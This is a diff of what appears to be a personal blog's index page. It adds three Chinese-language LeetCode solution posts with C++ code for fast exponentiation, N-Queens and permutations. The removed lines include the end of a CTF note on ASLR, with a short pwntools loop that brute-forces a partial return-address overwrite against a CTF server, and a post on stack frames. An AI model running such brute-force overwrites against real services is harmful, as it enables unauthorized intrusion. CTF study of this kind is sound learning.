@@ -116,7 +116,7 @@
   <nav class="site-state">
       <div class="site-state-item site-state-posts">
         <a href="/archives/">
-          <span class="site-state-item-count">63</span>
+          <span class="site-state-item-count">66</span>
           <span class="site-state-item-name">posts</span>
         </a>
       </div>
@@ -152,6 +152,244 @@
 
 
     <div class="main-inner index posts-expand">
+
+    
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2021/05/30/LC-Pow(n,x)/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="甜药补习班吊尾生">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="划水骗分二十年，没人比我更懂蒻">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          <a href="/2021/05/30/LC-Pow(n,x)/" class="post-title-link" itemprop="url">LC-Pow(n,x)</a>
+        </h2>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">Posted on</span>
+
+      <time title="Created: 2021-05-30 12:48:30" itemprop="dateCreated datePublished" datetime="2021-05-30T12:48:30+08:00">2021-05-30</time>
+    </span>
+      <span class="post-meta-item">
+        <span class="post-meta-item-icon">
+          <i class="far fa-calendar-check"></i>
+        </span>
+        <span class="post-meta-item-text">Edited on</span>
+        <time title="Modified: 2022-02-28 12:19:36" itemprop="dateModified" datetime="2022-02-28T12:19:36+08:00">2022-02-28</time>
+      </span>
+
+  
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+          <h2 id="让计算机很快地求出-ab">让计算机很快地求出 $ a^b $</h2>
+<p>暴力相乘的话，电脑要计算 b 次。 用快速幂，计算次数在 <span class="math inline">\(log_2b\)</span> 级别，很实用。</p>
+<h2 id="原理">原理</h2>
+<p>假设我们需要计算<span class="math inline">\(3^{11}\)</span>，因为<span class="math inline">\((11)_{10}=(1011)_{2}\)</span>，即<span class="math inline">\(11=1 \cdot 2^0 + 1 \cdot 2^1 + 0 \cdot 2^2 + 1 \cdot 2^3=1+2+0+8\)</span>，故<span class="math inline">\(3^{11}=3^{1+2+0+8}=3^1\cdot3^2\cdot 3^0\cdot3^8=3^{1\cdot2^0}\cdot3^{1\cdot2^1}\cdot 3^{0\cdot2^2}\cdot3^{1\cdot2^3}\)</span>。</p>
+<p>原本需要3累乘11次如今只需要操作4次</p>
+<p>那么问题的关键就是：b如何展开提取</p>
+<p>b&amp;1 &amp;在这里做运算符，叫做按位与 c=a&amp;b 则c等于a与b分别的二进制的每一位进行“与运算”的结果 b =1011 1 =0001 b&amp;1 =0001</p>
+<p>1.只有b的二进制的最后一位是1时，b&amp;1才会是1 2.同时十进制b/2相当于二进制b砍掉最低位，又或者直接b&gt;&gt;1也有一样的效果 相结合，妙啊，阿sir</p>
+<h1 id="section">100%，72%</h1>
+<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> </span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">double</span> <span class="title">quickPow</span><span class="params">(<span class="keyword">double</span>&amp; x, <span class="keyword">int</span>&amp; n)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">double</span> ans = <span class="number">1</span>,base = x;<span class="comment">//ans是要返回的答案； base是用于累乘的每一项</span></span><br><span class="line">        <span class="keyword">while</span> (n)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span> (n &amp; <span class="number">1</span>)ans *= base;</span><br><span class="line">            base *= base;<span class="comment">//base: x^1 --&gt; x^2 --&gt; x^4 --&gt; x^8</span></span><br><span class="line">            n /= <span class="number">2</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> ans;<span class="comment">//总结：base累乘增长很快，而我只需判断每一个base要不要乘上去，根据前面乱七八糟的推理，能成。</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">double</span> <span class="title">myPow</span><span class="params">(<span class="keyword">double</span> x, <span class="keyword">int</span> n)</span> </span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (n &lt; <span class="number">0</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">double</span> ans = <span class="built_in">quickPow</span>(x, n);</span><br><span class="line">            <span class="keyword">return</span> <span class="number">1.0</span> / ans;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">double</span> ans = <span class="built_in">quickPow</span>(x, n);</span><br><span class="line">        <span class="keyword">return</span> ans;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
+
+      
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+        <div class="post-eof"></div>
+      
+    </footer>
+  </article>
+</div>
+
+
+
+
+    
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2021/05/30/LC-N-Queens/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="甜药补习班吊尾生">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="划水骗分二十年，没人比我更懂蒻">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          <a href="/2021/05/30/LC-N-Queens/" class="post-title-link" itemprop="url">LC-N-Queens</a>
+        </h2>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">Posted on</span>
+
+      <time title="Created: 2021-05-30 10:20:29" itemprop="dateCreated datePublished" datetime="2021-05-30T10:20:29+08:00">2021-05-30</time>
+    </span>
+      <span class="post-meta-item">
+        <span class="post-meta-item-icon">
+          <i class="far fa-calendar-check"></i>
+        </span>
+        <span class="post-meta-item-text">Edited on</span>
+        <time title="Modified: 2022-02-24 14:02:11" itemprop="dateModified" datetime="2022-02-24T14:02:11+08:00">2022-02-24</time>
+      </span>
+
+  
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+          <h1 id="第一次手写93.8339.95">第一次手写(93.83%,39.95% )</h1>
+<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="keyword">bool</span> row[<span class="number">10</span>] = &#123; <span class="number">0</span> &#125;, left[<span class="number">20</span>] = &#123; <span class="number">0</span> &#125;, right[<span class="number">20</span>] = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">    vector&lt;vector&lt;string&gt;&gt;ans;  <span class="comment">//答案</span></span><br><span class="line">    vector&lt;<span class="keyword">int</span>&gt;anss;            <span class="comment">//每一种解法</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">found</span><span class="params">()</span>    <span class="comment">//找到一种解法</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        vector&lt;string&gt;ansss;    <span class="comment">//string类型的每一种解法</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt;= anss.<span class="built_in">size</span>() - <span class="number">1</span>; ++i)<span class="comment">//棋盘初始化</span></span><br><span class="line">        &#123;</span><br><span class="line">            string a;</span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">0</span>; j &lt;= anss.<span class="built_in">size</span>() - <span class="number">1</span>; ++j)a += <span class="string">&#x27;.&#x27;</span>;</span><br><span class="line">            ansss.<span class="built_in">push_back</span>(a);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt;= anss.<span class="built_in">size</span>() - <span class="number">1</span>; ++i)</span><br><span class="line">            ansss[i][anss[i] - <span class="number">1</span>] = <span class="string">&#x27;Q&#x27;</span>;</span><br><span class="line">        ans.<span class="built_in">push_back</span>(ansss);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">nqueens</span><span class="params">(<span class="keyword">int</span> line, <span class="keyword">int</span>&amp; n)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">1</span>; i &lt;= n; ++i)<span class="comment">//行优先放置，即i为第i列</span></span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span> (!row[i] &amp;&amp; !left[line + i] &amp;&amp; !right[line - i + <span class="number">10</span>])</span><br><span class="line">            &#123;</span><br><span class="line">                row[i] = <span class="number">1</span>;</span><br><span class="line">                left[line + i] = <span class="number">1</span>;</span><br><span class="line">                right[line - i + <span class="number">10</span>] = <span class="number">1</span>;</span><br><span class="line">                anss.<span class="built_in">push_back</span>(i);</span><br><span class="line">                <span class="keyword">if</span> (anss.<span class="built_in">size</span>() == n)<span class="built_in">found</span>(); <span class="keyword">else</span> <span class="built_in">nqueens</span>(line + <span class="number">1</span>, n);</span><br><span class="line">                row[i] = <span class="number">0</span>;</span><br><span class="line">                left[line + i] = <span class="number">0</span>;</span><br><span class="line">                right[line - i + <span class="number">10</span>] = <span class="number">0</span>;</span><br><span class="line">                anss.<span class="built_in">pop_back</span>();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    vector&lt;vector&lt;string&gt;&gt; <span class="built_in">solveNQueens</span>(<span class="keyword">int</span> n)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">nqueens</span>(<span class="number">1</span>, n);</span><br><span class="line">        <span class="keyword">return</span> ans;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
+<p>思路：</p>
+<p>用三个数组表示占用： row列占用，left左斜占用，right右斜占用</p>
+<p>一共有n列，第i列占用则row[i]置1</p>
+<p>左斜2n-1个，特征为 每一斜 行列下标相加相同，第i斜占用则left[i]置1</p>
+<p>右斜本应2n-1个，特征为 每一斜 行下标减列下标相同，第i斜占用则right[i]置1，但问题在于，行列下标相减可能会出现负数，故右斜下标应该整体右移。</p>
+<p>按行放置，放置到第n行是得到一种解法</p>
+<h1 id="根据题解优化后93.8374">根据题解优化后93.83%,74%</h1>
+<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="keyword">bool</span> row[<span class="number">10</span>] = &#123; <span class="number">0</span> &#125;, left[<span class="number">20</span>] = &#123; <span class="number">0</span> &#125;, right[<span class="number">20</span>] = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">    vector&lt;vector&lt;string&gt;&gt;ans;  <span class="comment">//答案</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">dfs</span><span class="params">(<span class="keyword">int</span> line, <span class="keyword">int</span>&amp; n, vector&lt;string&gt;&amp; anss)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (line == n)ans.<span class="built_in">push_back</span>(anss);<span class="comment">//放置完n行，找到一种解法，打入ans</span></span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; n; ++i)<span class="comment">//行优先放置，即i为第i列</span></span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span> (!row[i] &amp;&amp; !left[line + i] &amp;&amp; !right[line - i + n])</span><br><span class="line">            &#123;</span><br><span class="line">                row[i] = left[line + i] = right[line - i + n] = <span class="literal">true</span>;</span><br><span class="line">                anss[line][i] = <span class="string">&#x27;Q&#x27;</span>;</span><br><span class="line">                <span class="built_in">dfs</span>(line + <span class="number">1</span>, n, anss);</span><br><span class="line">                row[i] = left[line + i] = right[line - i + n] = <span class="literal">false</span>;</span><br><span class="line">                anss[line][i] = <span class="string">&#x27;.&#x27;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    vector&lt;vector&lt;string&gt;&gt; <span class="built_in">solveNQueens</span>(<span class="keyword">int</span> n)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="function">vector&lt;string&gt; <span class="title">anss</span><span class="params">(n, string(n, <span class="string">&#x27;.&#x27;</span>))</span></span>;<span class="comment">//每一种解法的初始化</span></span><br><span class="line">        <span class="built_in">dfs</span>(<span class="number">0</span>, n, anss);</span><br><span class="line">        <span class="keyword">return</span> ans;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
+<p>思路不变，代码优化，空间优化</p>
+<p>新语法： vector<string> anss(n, string(n, '.'));</string></p>
+
+      
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+        <div class="post-eof"></div>
+      
+    </footer>
+  </article>
+</div>
+
+
+
+
+    
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2021/05/09/LC-Permutations/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="甜药补习班吊尾生">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="划水骗分二十年，没人比我更懂蒻">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          <a href="/2021/05/09/LC-Permutations/" class="post-title-link" itemprop="url">LC-Permutations</a>
+        </h2>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">Posted on</span>
+
+      <time title="Created: 2021-05-09 16:52:07" itemprop="dateCreated datePublished" datetime="2021-05-09T16:52:07+08:00">2021-05-09</time>
+    </span>
+      <span class="post-meta-item">
+        <span class="post-meta-item-icon">
+          <i class="far fa-calendar-check"></i>
+        </span>
+        <span class="post-meta-item-text">Edited on</span>
+        <time title="Modified: 2022-02-24 14:06:19" itemprop="dateModified" datetime="2022-02-24T14:06:19+08:00">2022-02-24</time>
+      </span>
+
+  
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+          <h1 id="第一次手写beat6950">第一次手写（beat69%,50%）</h1>
+<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> </span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">	vector&lt;<span class="keyword">int</span>&gt; a;	<span class="comment">//存放临时元素</span></span><br><span class="line">	<span class="keyword">bool</span> used[<span class="number">8</span>] = &#123; <span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span> &#125;;	<span class="comment">//标记是否用过</span></span><br><span class="line">	vector&lt;vector&lt;<span class="keyword">int</span>&gt;&gt;ans;	<span class="comment">//返回的答案</span></span><br><span class="line"></span><br><span class="line">	vector&lt;vector&lt;<span class="keyword">int</span>&gt;&gt; <span class="built_in">permute</span>(vector&lt;<span class="keyword">int</span>&gt;&amp; nums)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="built_in">dfs</span>(<span class="number">0</span>, nums);</span><br><span class="line">		<span class="keyword">return</span> ans;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="function"><span class="keyword">void</span> <span class="title">dfs</span><span class="params">(<span class="keyword">int</span> step, vector&lt;<span class="keyword">int</span>&gt;&amp; nums)</span>	<span class="comment">//（正在存放第几个元素，需要全排序的数组）</span></span></span><br><span class="line"><span class="function">	</span>&#123;</span><br><span class="line">		<span class="keyword">if</span> (step == nums.<span class="built_in">size</span>())		<span class="comment">//存放第n个元素（不存在），即存放完所有元素，是一种排序</span></span><br><span class="line">		&#123;</span><br><span class="line">			ans.<span class="built_in">push_back</span>(a);</span><br><span class="line">			<span class="keyword">return</span>;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt;= (<span class="keyword">int</span>)nums.<span class="built_in">size</span>() - <span class="number">1</span>; ++i)	<span class="comment">//遍历所有元素</span></span><br><span class="line">			<span class="keyword">if</span> (used[i] == <span class="number">0</span>)	<span class="comment">//如果第i个元素没有用过</span></span><br><span class="line">			&#123;</span><br><span class="line">				a.<span class="built_in">push_back</span>(nums[i]);</span><br><span class="line">				used[i] = <span class="number">1</span>;		<span class="comment">//标记为用过</span></span><br><span class="line">				<span class="built_in">dfs</span>(step + <span class="number">1</span>, nums);		<span class="comment">//放置下一个元素</span></span><br><span class="line">				used[i] = <span class="number">0</span>;</span><br><span class="line">				a.<span class="built_in">pop_back</span>();	<span class="comment">//第i个元素的存放即其相关处理完毕，去处理i+1个</span></span><br><span class="line">			&#125;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
+<h1 id="stlbeat6970">STL(beat69%,70%)</h1>
+<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution2</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">	vector&lt;vector&lt;<span class="keyword">int</span>&gt;&gt; <span class="built_in">permute</span>(vector&lt;<span class="keyword">int</span>&gt;&amp; nums)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="built_in">sort</span>(nums.<span class="built_in">begin</span>(), nums.<span class="built_in">end</span>());<span class="comment">//从小到大</span></span><br><span class="line">		<span class="keyword">int</span> a[<span class="number">8</span>] = &#123; <span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span> &#125;;</span><br><span class="line">		vector&lt;vector&lt;<span class="keyword">int</span>&gt;&gt;ans;	<span class="comment">//返回的答案</span></span><br><span class="line">		<span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt;= nums.<span class="built_in">size</span>() - <span class="number">1</span>; ++i)a[i] = nums[i];</span><br><span class="line">		<span class="keyword">do</span></span><br><span class="line">		&#123;</span><br><span class="line">			<span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt;= nums.<span class="built_in">size</span>() - <span class="number">1</span>; ++i)nums[i]=a[i];</span><br><span class="line">			ans.<span class="built_in">push_back</span>(nums);</span><br><span class="line">		&#125;<span class="keyword">while</span>(<span class="built_in">next_permutation</span>(a, a+nums.<span class="built_in">size</span>()));</span><br><span class="line">		<span class="keyword">return</span> ans;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
+<h1 id="stlbeat10090">STL(beat100%,90%)</h1>
+<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">	vector&lt;vector&lt;<span class="keyword">int</span>&gt;&gt; <span class="built_in">permute</span>(vector&lt;<span class="keyword">int</span>&gt;&amp; nums)</span><br><span class="line">	&#123;</span><br><span class="line">		vector&lt;vector&lt;<span class="keyword">int</span>&gt;&gt;ans;</span><br><span class="line">		<span class="built_in">sort</span>(nums.<span class="built_in">begin</span>(), nums.<span class="built_in">end</span>());</span><br><span class="line">		<span class="keyword">do</span> &#123;ans.<span class="built_in">push_back</span>(nums);&#125;</span><br><span class="line">		<span class="keyword">while</span> (<span class="built_in">next_permutation</span>(nums.<span class="built_in">begin</span>(), nums.<span class="built_in">end</span>()));</span><br><span class="line">		<span class="keyword">return</span> ans;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
+
+      
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+        <div class="post-eof"></div>
+      
+    </footer>
+  </article>
+</div>
+
+
+
 
     
 
@@ -870,361 +1108,6 @@ transform.forward 代表某物体的x，y，z轴的指向 这3个都是标准向
 <p>一旦程序开启了ASLR，除了低3位的地址以外其余全是扯淡，低位地址靠查，高位地址试出来</p>
 <p>一个例子</p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">	io = remote(<span class="string">&quot;node2.hackingfor.fun&quot;</span>,<span class="number">36058</span>)</span><br><span class="line">	io.send(<span class="string">&quot;a&quot;</span>*<span class="number">16</span>+p16(<span class="number">0x64e1</span>))</span><br><span class="line">	res = io.recvall()</span><br><span class="line">	<span class="keyword">if</span> <span class="string">&quot;&#123;&quot;</span> <span class="keyword">in</span> res: <span class="keyword">break</span></span><br></pre></td></tr></table></figure>
-
-      
-    </div>
-
-    
-    
-    
-
-    <footer class="post-footer">
-        <div class="post-eof"></div>
-      
-    </footer>
-  </article>
-</div>
-
-
-
-
-    
-
-
-<div class="post-block">
-  
-  
-
-  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
-    <link itemprop="mainEntityOfPage" href="http://example.com/2021/04/04/%E5%87%BD%E6%95%B0%E8%B0%83%E7%94%A8-%E6%A0%88%E5%B8%A7/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/avatar.gif">
-      <meta itemprop="name" content="甜药补习班吊尾生">
-      <meta itemprop="description" content="">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="划水骗分二十年，没人比我更懂蒻">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          <a href="/2021/04/04/%E5%87%BD%E6%95%B0%E8%B0%83%E7%94%A8-%E6%A0%88%E5%B8%A7/" class="post-title-link" itemprop="url">函数调用-栈帧</a>
-        </h2>
-
-        <div class="post-meta-container">
-          <div class="post-meta">
-    <span class="post-meta-item">
-      <span class="post-meta-item-icon">
-        <i class="far fa-calendar"></i>
-      </span>
-      <span class="post-meta-item-text">Posted on</span>
-
-      <time title="Created: 2021-04-04 20:28:56" itemprop="dateCreated datePublished" datetime="2021-04-04T20:28:56+08:00">2021-04-04</time>
-    </span>
-      <span class="post-meta-item">
-        <span class="post-meta-item-icon">
-          <i class="far fa-calendar-check"></i>
-        </span>
-        <span class="post-meta-item-text">Edited on</span>
-        <time title="Modified: 2021-09-05 10:18:03" itemprop="dateModified" datetime="2021-09-05T10:18:03+08:00">2021-09-05</time>
-      </span>
-
-  
-</div>
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-          <p><strong>代码</strong>生成<strong>可执行文件</strong> <strong>可执行文件</strong>运行加载到<strong>内存</strong> 其中<strong>机器指令</strong>位于<strong>代码段</strong></p>
-<img src="/2021/04/04/%E5%87%BD%E6%95%B0%E8%B0%83%E7%94%A8-%E6%A0%88%E5%B8%A7/1.jpg" class>
-<p>栈有高地址向低地址生成</p>
-<p>函数调用时，用栈来存放局部变量、参数、返回地址等。</p>
-<p>ebp指向栈底部（在高地址）（该寄存器存放的是栈地址）（可以用来索引确定函数参数或局部变量的位置） esp指向栈顶（在低地址）（该寄存器存放的是栈地址） eip指向下一条需要指向的指令（在代码段）（该寄存器存放的是代码段的地址）</p>
-<p>call指令之前： 首先将被调用函数的参数按照逆序依次压入栈内。如果被调用函数不需要参数，则没有这一步骤。</p>
-<p>call指令只做两件事： 1.打入返回地址 （push eip） 2.跳转（eip=%%%%）</p>
-<p>函数开头： 1.分配栈帧大小（esp=esp-n）（之后用栈就往[esp+m]里写东西） 2.保存母函数的栈基地址于栈中（[esp+m1]=ebp）（母函数也有其栈帧） 3.确定子函数的栈基地址，即当前栈最新空着的地方（ebp=esp+m2） 函数中间： 执行该子函数在代码段的其它指令，其中栈会刚好用到esp+n处 函数结尾： 1.恢复ebp存储母函数的栈基地址（ebp=[esp+m1]） 2.释放该子栈帧的空间（esp=esp+n）</p>
-<p>ret指令只做两件事： 1.弹出返回地址 （eip=pop） 2.跳转</p>
-<p>这是函数嵌套调用时栈的模样： <img src="/2021/04/04/%E5%87%BD%E6%95%B0%E8%B0%83%E7%94%A8-%E6%A0%88%E5%B8%A7/1.png" class></p>
-<p>PS：CGfsb遗留的问题至此解决</p>
-
-      
-    </div>
-
-    
-    
-    
-
-    <footer class="post-footer">
-        <div class="post-eof"></div>
-      
-    </footer>
-  </article>
-</div>
-
-
-
-
-    
-
-
-<div class="post-block">
-  
-  
-
-  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
